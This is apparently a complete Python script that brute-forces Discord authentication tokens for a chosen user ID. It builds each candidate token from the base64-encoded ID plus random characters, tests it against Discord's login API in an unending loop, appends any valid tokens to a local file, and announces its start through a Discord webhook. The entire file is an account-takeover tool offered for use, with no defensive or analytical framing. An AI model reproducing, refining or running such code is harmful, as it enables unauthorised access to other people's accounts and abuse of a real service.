import base64
import os
import random
import string
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from discord_webhook import DiscordWebhook

# Replace <YOUR_WEBHOOK_URL> with the URL of your Discord webhook
WEBHOOK_URL = "<YOUR_WEBHOOK_URL>"

# Set up the HTTP session with retries and backoff
retry_strategy = Retry(
    total=3,
    status_forcelist=[429, 500, 502, 503, 504],
    backoff_factor=1
)
http_adapter = HTTPAdapter(max_retries=retry_strategy)
session = requests.Session()
session.mount("https://", http_adapter)

# Encode the user ID to create the initial token
id_to_token = base64.b64encode((input("ID TO TOKEN --> ")).encode("ascii"))
id_to_token = str(id_to_token)[2:-1]

# Send a "running" message to the webhook to indicate that the code has started
webhook = DiscordWebhook(url=WEBHOOK_URL, content="@everyone Code is running")
response = webhook.execute()

# Loop to generate and test tokens
while id_to_token == id_to_token:
    token = id_to_token + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=4)) + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=25))
    headers={
        'Authorization': token
    }
    login = session.get('https://discordapp.com/api/v9/auth/login', headers=headers)
    try:
        if login.status_code == 200:
            print('[+] VALID' + ' ' + token)
            # Write the valid token to a file
            with open('hit.txt', 'a+') as f:
                f.write(f'{token}\n')
        else:
            print('[-] INVALID' + ' ' + token)
    finally:
        print("")
